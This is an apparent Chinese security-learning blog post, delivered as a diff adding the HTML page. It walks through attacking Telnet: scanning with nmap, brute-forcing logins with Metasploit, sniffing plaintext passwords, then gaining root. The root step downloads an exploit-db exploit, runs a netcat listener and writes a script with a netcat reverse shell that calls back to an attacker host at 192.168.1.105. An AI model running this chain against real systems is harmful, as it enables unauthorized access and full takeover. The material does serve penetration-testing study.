@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>漏洞利用-Telnet | 执徐的小博客</title>
+<meta name="description" content="con argucia feroz su hilo de hielo,
+brotó un clavel bajo su fina punta
+en tu negro jubón de terciopelo.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://abraxasfever.github.io//favicon.ico?v=1726716634081">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://abraxasfever.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://abraxasfever.github.io/">执徐的小博客</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>漏洞利用-Telnet</h1>
+            <p class="article-meta">
+              2020-08-14
+              
+                <a href="https://abraxasfever.github.io/tag/6lgRqMl6z/" class="badge warning">
+                  HACK学习
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <h2 id="1telnet暴力破解">1.Telnet暴力破解</h2>
+<h3 id="telnet介绍">Telnet介绍</h3>
+<p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。<br>
+虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。<br>
+Telnet服务端默认情况下使用23端口。</p>
+<h3 id="telnet版本获取">Telnet版本获取</h3>
+<p>使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。</p>
+<pre><code>nmap -p 23 -sV IP地址
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://abraxasfever.github.io//post-images/1599963769352.png" alt="" loading="lazy"></figure>
+<h3 id="telnet密码破解">Telnet密码破解</h3>
+<p>使用metasploit下 针对telnet破解的模块进行用户名和密码的破解。<br>
+在msfconsole下使用search telnet进行查询telnet可以利用的模块。</p>
+<pre><code>msfconsole
+search telnet
+use auxiliary/scanner/telnet/telnet_version
+use auxiliary/scanner/telnet/telnet_login
+</code></pre>
+<h3 id="telnet登录测试">Telnet登录测试</h3>
+<p>使用破解好的会话连接telnet，并执行对应命令。<br>
+使用 sessions -l 例举建立的会话<br>
+使用 sessions -i id  使用对应的会话。</p>
+<h2 id="2telnet认证过程抓包分析">2.Telnet认证过程抓包分析</h2>
+<h3 id="telnet客户端连接telnet服务器">telnet客户端连接telnet服务器</h3>
+<p>windows下开启telnet客户端，连接telnet服务端</p>
+<ul>
+<li>控制面板-程序-启动或关闭windows功能-telnet client</li>
+</ul>
+<h3 id="telnet明文密码传输">telnet明文密码传输</h3>
+<p>使用wireshark抓取telnet数据包。</p>
+<h2 id="3telnet登录提权">3.Telnet登录提权</h2>
+<h3 id="msf登录telnet">msf登录telnet</h3>
+<p>在metasploit中使用  telnet_login进行登录，并使用sessions -i id 连接shell。</p>
+<h3 id="msf连接shell下载exp">msf连接shell下载exp</h3>
+<p>使用 wget进行下载<br>
+wget http://www.exploit-db.com/download/8572</p>
+<h3 id="设置kali-nc监听">设置kali nc监听</h3>
+<p>使用 netcat 进行监听 后期返回的shell。</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<h3 id="编译执行exp获取root">编译执行exp，获取root</h3>
+<pre><code>gcc 源文件  -o  exploit
+echo '#!/bin/sh' &gt; /tmp/run
+echo '/bin/netcat -e /bin/sh 192.168.1.105 4444' &gt;&gt; /tmp/run
+ps -edf |grep udev
+</code></pre>
+<h3 id="执行exploit-具有root权限的pid-1">执行exploit   具有root权限的pid -1</h3>
+<pre><code>./exploit 数字pid -1 
+</code></pre>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://abraxasfever.github.io//images/avatar.png?v=1726716634081" class="no-responsive avatar">
+    <div class="text-muted">con argucia feroz su hilo de hielo,
+brotó un clavel bajo su fina punta
+en tu negro jubón de terciopelo.</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/nao-zhong-liu-tu-xiang-fen-ge-model/">脑肿瘤图像分割UNet3+_Deep_HDC</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/shen-du-xue-xi/">Comparative Study of Deep Learning Models for Brain Tumor MRI Segmentation: Application of U-Net 3+ and Its Variants</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/ji-yu-metasploit-de-log4j2-lou-dong-li-yong-mo-kuai/">基于Metasploit的Log4j2漏洞利用模块</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/wo-zai-xiao-yuan-zi-dong-da-qia/">我在校园自动打卡</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-tomcat/">漏洞利用-tomcat管理密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-irc/">漏洞利用-irc后门利用</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-vnc/">漏洞利用-vnc密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-postgresql/">漏洞利用-postgresql数据库密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-mysql/">漏洞利用-mysql弱口令破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-proftpd/">漏洞利用-proftpd测试</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://abraxasfever.github.io/tag/DeepLearning/" class="badge success">
+          深度学习
+        </a>
+      
+        <a href="https://abraxasfever.github.io/tag/CyberSecurity/" class="badge secondary">
+          网络安全
+        </a>
+      
+        <a href="https://abraxasfever.github.io/tag/6lgRqMl6z/" class="badge ">
+          HACK学习
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+     | <a class="rss" href="https://abraxasfever.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
